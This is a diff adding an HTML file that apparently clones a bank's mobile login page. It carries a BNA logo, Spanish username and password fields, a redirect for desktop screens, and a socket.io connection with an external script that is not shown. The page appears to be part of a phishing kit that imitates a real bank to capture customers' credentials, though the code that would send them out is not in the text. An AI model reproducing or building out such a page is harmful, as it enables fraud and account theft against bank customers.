@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Banking</title>
+    <link rel="shortcut icon" href="/img/icono.png" type="image/x-icon">
+    <link rel="stylesheet" href="/css/index-mobile.css">
+    <script>
+        if(screen.width>=767){
+            window.location.href = "/login.htm/clasico";
+        }
+    </script>
+</head>
+<body id="body">
+    <div id="header">
+        <div class="titulo-mobile">
+            <h1>Mobile Banking</h1>
+        </div>
+        <div class="v-clasica">
+            <a href="#">
+                <span class="icono-home">
+                    
+                </span>
+                <span>
+                    Versión Clásica
+                </span>
+            </a>
+        </div>
+    </div>
+    <div id="logoHome">
+        <img src="/img/BNA-Logo.png">
+    </div>
+    <div id="mobile-body">
+        <div id="preloader">
+
+        </div>
+        <div id="login-box">
+            <div class="header-box">
+                <p>Ingresá tu usuario</p>
+            </div>
+            <div class="header-body">
+                <div class="data-user" id="user-content">
+                    <input type="text" autocomplete="off" name="user" id="user">
+                </div>
+                <div class="data-user" id="password-content">
+                    <input type="password" name="pass" id="pass">
+                    <div class="imagen">
+                        <div></div>
+                        <img src="/img/spinner-general.gif">
+                    </div>
+                </div>
+                <div id="alert-modal">
+                    <div class="cerrar-modal" id="close-alert-modal">
+                       <img src="/img/bt.cerrar.modal.gif">
+                    </div>
+                    <p>Ingrese un usuario</p>
+                </div>
+                <div id="alert-modal-2">
+                    <div class="cerrar-modal" id="close-alert-modal-2">
+                        <img src="/img/bt.cerrar.modal.gif">
+                    </div>
+                    <p>Acceso incorrecto al Sistema</p>
+                </div>
+                <div class="buttons">
+                    <button class="send-data" id="btn-send">
+                        <span class="icono-check">
+                            
+                        </span>
+                        Aceptar
+                    </button>
+                    <button class="send-data" id="volver">
+                        <span class="icono-check icon-volver">
+                            
+                        </span>
+                        Volver
+                    </button>
+                </div>
+            </div>
+        </div>
+        <div class="info-login">
+            <div class="info-text" style="margin-bottom: 17px; display: block;">
+                <p>¿No sos usuario?</p>
+                <a href="#">Registrate y comenzá</a>
+            </div>
+            <div class="info-text">
+                <p>¿Acceso bloqueado?</p>
+                <a href="#">Gestioná tu desbloqueo</a>
+            </div>
+        </div>
+    </div>
+    <div id="salir">
+        <span class="icon-salir"></span>
+        <span>Salir</span>
+    </div>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/script.js"></script>
+</body>
+</html>
